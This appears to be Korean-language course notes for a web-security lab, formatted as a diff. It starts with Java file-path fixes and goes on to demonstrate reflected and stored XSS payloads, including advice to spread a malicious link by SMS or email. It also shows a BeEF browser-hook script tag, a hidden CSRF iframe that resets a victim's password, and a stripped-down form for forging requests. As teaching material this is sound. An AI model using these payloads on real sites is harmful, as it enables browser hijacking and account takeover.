@@ -1,0 +1,137 @@
+교육 내용은 아래 공유 폴더 및 웹 파일을 참고하세요. 
+탐색기 >> \\30.100.1.78\docs
+    또는 
+브라우저 >> http://30.100.1.78:5500/0812.txt
+
+
+
+CommonCode.java
+===============
+// 15라인
+// public final static String CONT_UPLOAD_FILE_DIR = "c:\\temp\\upload\\";
+public final static String CONT_UPLOAD_FILE_DIR = "/temp/upload/";
+
+
+UploadController.java
+=====================
+// 122라인
+// Resource resource = new FileSystemResource(
+//      session.getServletContext().getRealPath("/resources") + "\\" + fileName);
+Resource resource = new FileSystemResource(
+        session.getServletContext().getRealPath("/resources") + File.separator + fileName);
+
+// 149라인
+// file = new File(CommonCode.CONT_UPLOAD_FILE_DIR + "\\" + URLDecoder.decode(fileName, "UTF-8"));
+file = new File(CommonCode.CONT_UPLOAD_FILE_DIR + URLDecoder.decode(fileName, "UTF-8"));                
+
+
+AdminController.java
+====================
+// 262라인        
+// Path file = Paths.get(CONT_UPLOAD_FILE_DIR + "\\" + attach.getUploadPath() + "\\" + attach.getUuid()
+//       	+ "_" + attach.getFileName());
+Path file = Paths.get(CONT_UPLOAD_FILE_DIR + attach.getUploadPath() + "/" + attach.getUuid()
+			+ "_" + attach.getFileName());
+Files.deleteIfExists(file);
+
+if (Files.probeContentType(file).startsWith("image")) {
+    // Path thumbNail = Paths.get(CONT_UPLOAD_FILE_DIR + "\\" + attach.getUploadPath() + "\\s_"
+    //      + attach.getUuid() + "_" + attach.getFileName());
+    Path thumbNail = Paths.get(CONT_UPLOAD_FILE_DIR + attach.getUploadPath() + "/s_"
+            + attach.getUuid() + "_" + attach.getFileName());
+
+
+
+반사 XSS 
+========
+입력값이 다음 화면 출력에 사용되는 경우 
+
+ID 중복 체크                          check.jsp?id=abc<script>alert('xss')</script> 
+ID : abc<script>alert('xss')</script> [check]   ----------------------->  DB 조회 결과를 반환
+                                                       |
+                                                    "<%=rquest.getParameter("id")%>"는 존재...
+                                                       |              
+    "abc<script>alert('xss')</script>"는 존재.... <----+
+
+
+반사 크로스 스크립트 취약점이 존재한다 것을 확인하면 공격자는 아래와 같은 공격 문자열을 생성해서
+<a href="http://www.test.com/check.jsp?id=abc<script>alert('xss')</script>">궁금해 하는 내용</a>
+불특정 다수에서 문자(SMS), 이메일, 단축 URL 형태로 전달
+
+
+공지사항에 댓글을 입력
+댓글: <script> alert("xss1") </script>
+작성자: <script> alert("xss2") </script>
+
+
+┌──(kali㉿kali)-[~]
+└─$ sudo beef-xss     
+
+아래 코드를 포함한 댓글 추가
+BeEF<script src="http://localhost:3000/hook.js"></script>
+
+
+
+
+패스워드 변경 기능
+
+패스워드 변경 신청                       패스워드 변경 처리
+changePwForm                            changePwProc
+
+New PW 1: _______                       1) 인증 여부 확인
+New PW 2: _______                       2) 처리에 필요한 값 중 
+                                           사용자가 결정해야 하는 값이 전달되었는지 확인
+          [ 변경 ]                      3) 처리에 필요한 값 중 
+                                           서버가 가지고 있는 값을 확인 
+                                        4) 사용자의 패스워드를 새 패스워드로 변경
+
+회원제 서비스를 제공하는 게시판에 아래와 같은 공격 코드를 삽입
+꼭 보세요.
+----------------------------------------
+.... <iframe src="changePwProc?newPw1=1234&newPw2=1234" width="0" height="0"></iframe> ...
+
+
+
+소스 코드 보기 기능을 이용해서 참가 신청 시 서버로 전달되는 내용을 확인
+
+<form role="form" action="/regist/register" method="post" data-toggle="validator">
+    <div class="form-group">
+        <label for="name" class="control-label">이름</label> 
+        <input class="form-control" name="name" id="name" placeholder="이름" required data-error="이름을 입력하세요.">
+        <div class="help-block with-errors"></div>
+    </div>
+    <div class="form-group">
+        <label for="email" class="control-label">이메일</label>
+        <input class="form-control" name="email" id="email" placeholder="이메일" type="email" required data-error="이메일을 입력하세요.">
+        <div class="help-block with-errors"></div>
+    </div>
+    <div class="form-group">
+        <label for="phone" class="control-label">연락처</label>
+        <input class="form-control" name="phone" id="phone" placeholder="연락처" type="tel" required data-error="연락처를 입력하세요.">
+        <div class="help-block with-errors"></div>
+    </div>
+    <div class="form-group">
+        <label for="password" class="control-label">패스워드</label>
+        <input class="form-control" name="password" id="password" placeholder="패스워드" type="password" required data-error="패스워드를 입력하세요.">
+        <div class="help-block with-errors"></div>
+    </div>
+    <div class="form-group">
+        <label for="content" class="control-label">하고싶은 말</label>
+        <textarea class="form-control" rows="3" name="content" id="content" placeholder="하고싶은 말"></textarea>
+    </div>
+
+    <button type="submit" data-oper="save"   class="btn btn-primary">저장</button>
+</form>
+
+
+
+서버로 전달하는 기능과 무관한 내용을 삭제
+
+<form action="/regist/register" method="post">
+<input name="name">
+<input name="email">
+<input name="phone">
+<input name="password">
+<textarea name="content"></textarea>
+<button type="submit">저장</button>
+</form>
